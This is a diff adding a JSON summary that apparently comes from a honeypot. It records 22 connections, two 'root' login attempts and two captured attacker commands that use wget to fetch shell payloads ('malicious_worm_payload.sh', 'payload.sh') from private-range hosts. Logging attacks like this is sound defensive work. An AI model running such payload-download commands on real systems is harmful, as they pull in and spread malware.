@@ -1,0 +1,33 @@
+{
+    "total_connections": 22,
+    "unique_attackers_count": 2,
+    "top_sources": {
+        "ACTION:CRED_CAPTURE": 6,
+        "LOCAL_LOOPBACK": 8,
+        "Germany/Falkenstein (Hetzner Online GmbH)": 8
+    },
+    "captured_credentials": [
+        {
+            "timestamp": "2026-06-27 06:07:27",
+            "attacker_id": "17eef7331101",
+            "credentials": "USER: 'root'"
+        },
+        {
+            "timestamp": "2026-06-27 06:14:10",
+            "attacker_id": "17eef7331101",
+            "credentials": "USER: 'root'"
+        }
+    ],
+    "extracted_malware_urls": [
+        {
+            "timestamp": "2026-06-27 06:08:05",
+            "attacker_id": "17eef7331101",
+            "payload_details": "BLOB: 'wget http://192.168.1.50/malicious_worm_payload.sh'"
+        },
+        {
+            "timestamp": "2026-06-27 06:15:16",
+            "attacker_id": "17eef7331101",
+            "payload_details": "BLOB: 'wget http://10.10.10.5/payload.sh'"
+        }
+    ]
+}
